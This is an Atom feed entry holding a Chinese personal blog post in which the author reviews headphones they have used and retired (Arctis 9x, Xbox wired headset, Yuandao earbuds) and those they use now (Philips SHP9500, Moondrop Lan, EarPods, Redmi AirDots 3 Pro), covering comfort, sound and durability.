    <id>http://lordaeronesz.github.io/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/</id>
    <published>2024-03-12T01:03:08.000Z</published>
    <updated>2024-07-01T11:03:00.598Z</updated>
    
    <content type="html"><![CDATA[<p>最近几个月看了不少耳机相关的内容，初步了解了一些耳机的参数指标以及选购方案，同时也给自己使用的耳机进行了一波更新换代。本文就简单盘点一下自己之前用过的和现在正在使用的耳机，内容完全基于个人的使用体验。</p><span id="more"></span><h1 id="已退役"><a href="#已退役" class="headerlink" title="已退役"></a>已退役</h1><h2 id="赛睿-Arctis9x"><a href="#赛睿-Arctis9x" class="headerlink" title="赛睿 Arctis9x"></a>赛睿 Arctis9x</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/9x.jpg"></p><p>主要是为了无线连接 xbox 而购入。买之前看了不少网上的评价，包括视频评测以及 RTINGS 网站上的测试，感觉很不错，但是这耳机并没有国行版本，而且海外版售价高达 200 美元，对我而言实在是太贵，就在淘宝花 398 购入了一副所谓的“9成新”的“洋垃圾”。</p><p>单就产品本身的素质来说，我觉得还是很不错的。尽管作为游戏耳机，但它的音乐表现依然非常出色，三频的表现十分均衡。参考 RTINGS 网站上对于 9x 的评测，其中 Neutral Sound 项评分高达 7.8 分并给出了 “satisfactory” 的评价。麦克风质量也相当不错，这根可伸缩的麦克风虽小，但却拥有优秀的收音质量和降噪能力，不过我也只是拿到手的时候测试了一下，并没有怎么使用。佩戴方面，耳机头梁采用了松紧带的设计，使得佩戴时不至于压头。耳罩不算很透气，夏天佩戴可能会比较热，但好在相对柔软，网上普遍说赛睿 arctis  系列这套模具比较夹头，我感觉也稍微有点，但在可接受的范围之内。总之，作为游戏耳机，我对 9x 的表现还是相当满意的。</p><p>但由于是二手产品，电池不可避免的有一定程度的损耗，我这副看上去损耗还比较大，官方标称的 20 小时续航，我实际使用大概只能撑六七个小时。另外，使用了不到一年之后，连接耳机头梁和发声单元的转轴就出现了松动的情况，最开始也没怎么在意，但结果是越用越松，直到耳机已经无法稳固佩戴，晃动耳机还能听到断裂的塑料碎片的声音，应该是转轴内部物理结构的损坏。上网上一看，原来是比较普遍的现象，就挺无语的。尝试在淘宝找耳机维修，发现价格还挺贵的，想想还是算了，只能无奈将其退役了。</p><h2 id="Xbox-官方有线头戴"><a href="#Xbox-官方有线头戴" class="headerlink" title="Xbox 官方有线头戴"></a>Xbox 官方有线头戴</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/xbox.jpg"></p><p>9x 退役之后，就想着找一个接替它的游戏头戴，在使用 9x 的过程中，我发现无线对我而言好像并不是那么重要，而且无线耳机还得时刻关注电量，以及考虑长期使用后电池损耗的问题，因此我这次主要把目光放在了有线头戴上。</p><p>在雷蛇噬魂鲨有线和 Xbox 官方有线的纠结中，我最终还是选择了后者。现在想想，主要原因可能还是因为 Xbox 的外观设计更合我意以及期待官方配件的玄学加成（？？）。旋钮式音量调节、可弯曲收纳的麦克风以及 Xbox 标志性的绿色线材共同构成了这副耳机极简主义的设计。至少在外观部分，我还是比较喜欢的。</p><p>但耳机的实际使用体验不能说糟糕，却也很难让人满意。佩戴方面，耳罩是蛋白皮材质，触感还算 ok，也不夹头，但可能正因为不夹头，耳机的佩戴牢固性主要依靠压在头上的头梁来提供，佩戴时间稍长头部就会有很明显的不适感，因此佩戴方面的体验是很不理想的。音质表现也是完全没有达到要求，无论是风格还是素质都和之前使用的 9x 有比较明显的差距。调音风格上，9x 整体是偏向中高频的，听上去会比较亮，而 Xbox 有线则是偏向于中低频，声音非常的沉闷，刚拿到手听的时候就感觉非常不适应，与我的听音偏好很不匹配。素质上来说，9x 基本是完爆 Xbox 有线，毕竟二者其实本就不是一个价位段的产品，无论是解析力还是声场，前者相比后者都有非常明显的优势。之前我有对比过在游戏《荒野大镖客1》中同一个场景二者的声音表现，结果就是能够在 9x 中听到的一些非常微弱、具有方向感的环境声在 Xbox 有线中与游戏的场景音乐混作一团，丢失了大量细节。</p><p>最终，还是决定挂闲鱼出掉了。</p><h2 id="原道系列"><a href="#原道系列" class="headerlink" title="原道系列"></a>原道系列</h2><p>由于本人晚上睡觉时有收听电台的习惯，因此一副价格便宜、纯听个响的功能性耳机很有必要。因此号称听了触发“悔恨之泪”的原道就成为了我的首选。</p><p>原道系列这几年我也陆陆续续买了好多副了，包括最早散装的原道无迹，以及后来二次元封面的原道酱。最早的散装版本现在仍然在售，不过个人不太推荐，主要原因是线材质量不太行，我有好几副都是用了几个月之后出现了线材老化的情况，然后随之而来的就是耳机只有一边出声，不得不进行更换。后面出的原道酱在线材质量上有很大提升，我手里这条铜线版本用了一年多依然正常。不过作为我睡觉时佩戴的耳机，佩戴舒适度必然也要考虑其中，原道的这款平头塞采用了与经典的森海塞尔 mx500 相同的模具，声学结构设计上就很优秀，可能这也是原道在如此低的价位具备还不错的声音表现的重要原因，但是其在佩戴舒适度方面实在一般，耳机腔体不算小，长时间佩戴的情况下能感觉到由于塑料腔体与耳道硬接触而产生的硌痛感，戴上海绵套能相对缓解，但海绵套又很容易松动，时不时就会脱落，比较麻烦。</p><p>后来也有尝试过他家的 x39 微动圈，但是佩戴实在不牢固，稍微翻个身可能就掉了，另外入耳式也不适合长时间佩戴，容易出现中耳炎的症状，因此最终放弃。</p><h1 id="现役"><a href="#现役" class="headerlink" title="现役"></a>现役</h1><h2 id="飞利浦-SHP9500"><a href="#飞利浦-SHP9500" class="headerlink" title="飞利浦 SHP9500"></a>飞利浦 SHP9500</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/9500.jpg"></p><p>由于个人打游戏还是比较习惯头戴式耳机，因此在上述两幅头戴都退役之后就想着找一副音质出色、佩戴舒适的替代品。在各大论坛和评论区逛了一段时间，发现了一个反复被提到的名字：飞利浦 SHP9500，同时了解到这是一副开放式头戴，由于我之前并没有听过开放式头戴耳机的声音，对此比较好奇，加上价格也不算高，因此我也没有过多犹豫，就在闲鱼花 170 多淘了一副成色很不错的。</p><p>到手试听了一下，发现与此前听过的封闭式头戴的感受截然不同，声音非常通透干净，声场极其开阔，用通俗的语言来形容就是你能感受到各种乐器的声音分布在你耳朵的不同方位，临场感十足。这样开阔的声场也非常适合游玩大型 3A 游戏，能够很大程度上增加代入感。但是开放式也有很大的局限性，就是糟糕的隔音性能以及严重的漏音问题，这也意味着这类耳机的基本只能在比较私人的空间和场合使用，比较遗憾。</p><p>另一个令人印象深刻的点便是它的佩戴体验，个人使用过的头戴耳机不多，9500 绝对是其中佩戴最为舒适的无之一。耳机的可调节范围很大，加上透气且足够大的耳罩，使得大部分人都能通过简单调整获得一个比较舒适的佩戴感受，既不夹头也不压头，连续佩戴数个小时也不会感到疲劳。</p><p>最后要吐槽的一点就是原装线材虽然质感不错，但实在是太长了，足足有 3 米，我在使用了一段时间后还是嫌麻烦，自己买了一根飞利浦的 1.5 米编制线材，做工还算不错，与 9500 搭配也比较合适。</p><h2 id="水月雨-兰"><a href="#水月雨-兰" class="headerlink" title="水月雨 兰"></a>水月雨 兰</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/lan.jpg"></p><p>其实单论音质，9500 已经完全能够满足我的需求了，但是毕竟是开放式头戴，使用场景非常有限，就想着再入一副音质出色、方便携带、能够让我出门在外享受音乐的耳塞式耳机。作为我的候选产品的有 Nicehck DB2、兴戈 EW200、水月雨 竹2，以及我最终选择了的水月雨 兰，原因无外乎两点：平直中正的调音和优雅的外观。</p><p>首先是音质，购买前看网上评价说兰整体的调音取向是偏监听向的，低频不够有力，但个人平时听 ACG 音乐多一些，主要偏向于中高频，因此调音方面还算比较符合我的听音取向。拿到手后果然如此，并且解析力很强，不同乐器之间的分离度做得非常好，除了物理结构所限的声场外，整体听感已经很接近 9500 了，足以胜任个人的便携音乐耳机。</p><p>促使我选择兰的一个另外一个很重要的原因便是它的外观，当时在产品介绍页面第一眼看到便喜欢上了。不仅在于耳机腔体极简风格的设计，更在于原装线材与其共同搭配所表现出的一体性。线材的颜色本就与耳机本体风格很搭，还在分线处和插头部分使用了粉末冶金工艺，并配上兰标志性的 logo，进一步增强了耳机的质感，整体外观非常符合我的审美。</p><h2 id="苹果-Earpods"><a href="#苹果-Earpods" class="headerlink" title="苹果 Earpods"></a>苹果 Earpods</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/earpods.jpg"></p><p>个人现役的功能性耳机，也是我现在日常使用最多的耳机。</p><p>作为功能性耳机，佩戴舒适度必然是首先需要考虑的问题，earpods 在这方面可谓是相当优秀。轻盈的重量、贴耳的腔体以及光滑的材质共同造就了近乎无感的佩戴体验，以至于直到今天仍然有相当多的厂商模仿 earpods 的外观设计，可以说以一己之力开辟了半入耳式这个全新的赛道。</p><p>虽说个人主要把它当作功能性耳机来使用，但这并不意味着 earpods 的声音表现不行，相反，它的三频表现足够均衡，足以满足个人的大多数的影音需求。另外得益于开放式的设计，earpods 作为一副耳塞式耳机，拥有比其他封闭耳塞式耳机更加开阔的声场，整体的听感也更通透。</p><p>另外虽然个人使用的不多，但 earpods 这个不起眼的线控麦克风也值得一说。这个麦克风虽小，但却拥有相当不错的收音质量，参考 RTINGS 上的评分，earpods 的 Recording Quality 项高达 8.1 分，这个成绩已经达到了很多游戏耳机的水平，足以应付语音通话和线上会议的需求，缺点就是噪音抑制一般，需要在尽量安静的环境中使用。</p><p>官方 149 元的售价肯定称不上足够便宜以至于当消耗品来使用，但由于这款耳机已经发售多年，并且质量足够出色，以至于在二手市场上的保有量非常可观，基本上 50 ~ 60 元的价格就能淘到一副成色很不错的。因此只要能够接受二手，earpods 还是一个相当具有性价比的选择。</p><h2 id="红米-Airdots3pro"><a href="#红米-Airdots3pro" class="headerlink" title="红米 Airdots3pro"></a>红米 Airdots3pro</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/redmi.jpg"></p><p>红米的这副 TWS 还是 21 年的时候买的，但是个人使用的其实并不多。</p><p>耳机的质感还算比较出色，佩戴体验也很不错，比较牢固且舒适。声音表现放现在来看是比较糟糕的，整体的听感比较闷，即使切换到高音增强模式也没有太大改善，当然也可能与个人的听音喜好有关，总之对我而言，拿它来听音乐并不是一个好的选择。但毕竟是注重便携的 TWS，音质方面我也没有抱太高的期望，主要还是使用体验方面的问题。首先便是续航，我这副尽管使用并不频繁，但单次续航大概只有 3 ~ 4 个小时了，如果全程开启降噪或通透模式的话肯定会更低，加上充电仓后的总续航时间个人没有统计过，不过应该也不会太乐观。此外，不知道是什么原因，我总感觉在开启降噪模式后时不时会出现左右耳压不一致的情况，不知道是不是软件 bug，总之相当影响体验。最后就是耳机麦克风貌似只支持通话时调用，其他应用无法调用，因此诸如微信视频通话和录音等场合只能使用手机自带麦克风，原因不明。</p><p>虽说 airdots3pro 的使用体验放今天来看并不理想，但我目前并没有打算更换，毕竟我现在还是更习惯有线耳机即插即用、不用担心电量问题的省心感。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近几个月看了不少耳机相关的内容，初步了解了一些耳机的参数指标以及选购方案，同时也给自己使用的耳机进行了一波更新换代。本文就简单盘点一下自己之前用过的和现在正在使用的耳机，内容完全基于个人的使用体验。&lt;/p&gt;</summary>
    
    
    
    <category term="数码" scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E7%A0%81/"/>
    
    
    <category term="闲谈" scheme="http://lordaeronesz.github.io/tags/%E9%97%B2%E8%B0%88/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="数码" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E7%A0%81/"/>
    
  </entry>
  
</feed>
